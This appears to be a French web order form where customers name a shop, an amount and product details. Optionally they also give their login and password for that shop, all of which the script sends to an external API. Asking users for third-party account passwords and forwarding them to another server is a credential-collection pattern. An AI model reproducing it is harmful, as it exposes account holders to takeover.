<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Soumettre une commande</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Outfit',sans-serif;background:#f8fafc;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px;}
.header{text-align:center;padding:48px 20px 32px;max-width:500px;}
.header h1{font-size:2rem;font-weight:700;color:#0f172a;margin-bottom:8px;}
.header p{color:#64748b;font-size:1rem;line-height:1.5;}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:20px;padding:36px;max-width:500px;width:100%;box-shadow:0 2px 12px rgba(0,0,0,0.04);}
.card h3{font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:16px;}
.card hr{border:none;border-top:1px solid #e2e8f0;margin:20px 0;}
.form-group{margin-bottom:14px;}
.form-group label{display:block;font-size:0.78rem;color:#64748b;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:5px;}
.form-group input,.form-group textarea{width:100%;padding:10px 14px;border:1px solid #cbd5e1;border-radius:10px;font-size:0.9rem;font-family:'Outfit',sans-serif;outline:none;transition:border .2s;}
.form-group input:focus,.form-group textarea:focus{border-color:#6366f1;}
.form-group textarea{resize:vertical;min-height:70px;}
.row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.hint{font-size:0.78rem;color:#94a3b8;margin-bottom:12px;}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#0f172a,#1e293b);color:white;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;font-family:'Outfit',sans-serif;transition:all .2s;}
.btn:hover{box-shadow:0 4px 16px rgba(15,23,42,0.25);transform:translateY(-1px);}
.btn:disabled{opacity:0.5;cursor:not-allowed;}
.success{text-align:center;padding:60px 20px;}
.success .icon{font-size:4rem;margin-bottom:16px;}
.success h2{font-size:1.5rem;font-weight:700;color:#0f172a;margin-bottom:8px;}
.success p{color:#64748b;}
.success .btn{max-width:300px;margin:24px auto 0;}
.error{background:#fef2f2;border:1px solid #fecaca;color:#dc2626;padding:10px 14px;border-radius:10px;font-size:0.88rem;margin-bottom:12px;}
.footer{text-align:center;padding:24px;color:#94a3b8;font-size:0.8rem;}
</style>
</head>
<body>

<div id="app"></div>

<script>
const API = 'https://salesflow-api-production.up.railway.app';

const app = document.getElementById('app');

let submitted = false;

function render() {
  if (submitted) {
    app.innerHTML = `
      <div class="success">
        <div class="icon">✅</div>
        <h2>Demande envoyée avec succès</h2>
        <p>Votre demande a été enregistrée et sera traitée rapidement.<br>Vous serez contacté une fois votre commande prise en charge.</p>
        <button class="btn" onclick="reset()">📝 Nouvelle demande</button>
      </div>
      <div class="footer">Service rapide et sécurisé</div>
    `;
    return;
  }

  app.innerHTML = `
    <div class="header">
      <h1>🛒 Nouvelle commande</h1>
      <p>Remplissez les informations ci-dessous pour soumettre votre demande.</p>
    </div>
    <div class="card">
      <h3>👤 Vos informations</h3>
      <div class="form-group">
        <label>Votre nom *</label>
        <input id="nom" placeholder="Jean Dupont" />
      </div>
      <hr>
      <h3>🛍️ Commande</h3>
      <div class="row">
        <div class="form-group">
          <label>Site / Boutique *</label>
          <input id="boutique" placeholder="nike.com, amazon.fr..." />
        </div>
        <div class="form-group">
          <label>Montant total (€) *</label>
          <input id="montant" type="number" step="0.50" placeholder="0.00" />
        </div>
      </div>
      <div class="form-group">
        <label>Précisions</label>
        <textarea id="notes" placeholder="Produit, taille, couleur, lien..."></textarea>
      </div>
      <hr>
      <h3>🔐 Accès boutique (si demandé)</h3>
      <p class="hint">Remplissez uniquement si cela vous a été demandé.</p>
      <div class="row">
        <div class="form-group">
          <label>Identifiant / Email</label>
          <input id="ident" placeholder="jean@email.com" />
        </div>
        <div class="form-group">
          <label>Mot de passe</label>
          <input id="mdp" type="password" placeholder="••••••••" />
        </div>
      </div>
      <div id="error"></div>
      <button class="btn" id="submitBtn" onclick="submitForm()">📩 Envoyer ma demande</button>
    </div>
    <div class="footer">Service rapide et sécurisé · Vos données sont confidentielles</div>
  `;
}

async function submitForm() {
  const nom = document.getElementById('nom').value.trim();
  const boutique = document.getElementById('boutique').value.trim();
  const montant = parseFloat(document.getElementById('montant').value) || 0;
  const notes = document.getElementById('notes').value.trim();
  const ident = document.getElementById('ident').value.trim();
  const mdp = document.getElementById('mdp').value.trim();
  const errEl = document.getElementById('error');

  if (!nom) { errEl.innerHTML = '<div class="error">Le nom est obligatoire.</div>'; return; }
  if (!boutique) { errEl.innerHTML = '<div class="error">La boutique est obligatoire.</div>'; return; }
  if (montant <= 0) { errEl.innerHTML = '<div class="error">Le montant doit être supérieur à 0 €.</div>'; return; }

  const btn = document.getElementById('submitBtn');
  btn.disabled = true; btn.textContent = 'Envoi en cours...';

  try {
    await fetch(`${API}/api/demandes/submit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        nom_client: nom, boutique, montant,
        identifiant_boutique: ident, mdp_boutique: mdp, notes_client: notes
      })
    });
    submitted = true;
    render();
  } catch (e) {
    errEl.innerHTML = '<div class="error">Erreur lors de l\'envoi. Réessayez.</div>';
    btn.disabled = false; btn.textContent = '📩 Envoyer ma demande';
  }
}

function reset() { submitted = false; render(); }

render();
</script>
</body>
</html>
